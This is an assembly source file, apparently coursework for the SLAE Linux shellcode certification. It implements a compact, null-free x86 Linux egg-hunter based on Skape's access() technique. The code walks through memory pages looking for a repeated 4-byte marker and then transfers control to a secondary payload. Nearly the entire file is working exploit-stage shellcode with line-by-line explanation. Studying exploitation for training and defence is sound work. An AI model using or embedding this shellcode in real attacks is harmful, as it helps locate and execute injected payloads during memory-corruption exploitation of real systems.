; Filename: egg-hunter_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux null-free egg-hunter shellcode implementing Skape's 
; first technique using access() syscall
; Compile with:
; ./compile.sh egg-hunter_shellcode
; Size of shellcode: 39 bytes


global _start

section .text
_start:

    mov ebx, 0x50905090    ; Moving the 4-byte egg to EBX register
    xor ecx, ecx           ; Clearing ECX register
    mul ecx                ; Clearing EAX and EDX

    ; Function to skip to next page
    turn_page:             
    or dx, 0xfff           ; Bitwise OR of DX value - To load 4095 in DX

    ; Function to check whether the following 8 bytes of memory page is accessible or not
    check_page:
    inc edx                ; Increment EDX to make it a multiple of 4096 [PAGE_SIZE]
    pushad                 ; To preserve the current register values in stack
    lea ebx, [edx+0x4]     ; Load the address of the next 8 bytes in EBX to check
    mov al, 0x21           ; Load Syscall value for access() = 0x21 OR 33 in EAX
    int 0x80               ; Executing access() syscall
    cmp al, 0xf2           ; Comparing the return value in AL to 0xf2 == EFAULT
    popad                  ; Restore the register values as we preserved in the stack
    jz turn_page           ; Jump to next page if we got EFAULT otherwise continue

    ; Now that we know the memeory is accessible, we will search for our target!
    cmp [edx], ebx         ; Check if we got the egg in [EDX]
    jnz check_page         ; If not zero - Egg not found! Check the next 8 bytes of the page otherwise if zero - we already found the first 4 bytes of the egg
    cmp [edx+0x4], ebx     ; Check the next 4 bytes [EDX+4] to confirm the kill
    jnz check_page         ; If not zero - Egg wasn't found, false positive! otherwise if zero - mission accomplished - egg found successfully!
    jmp edx                ; Transfer control to the secondary payload


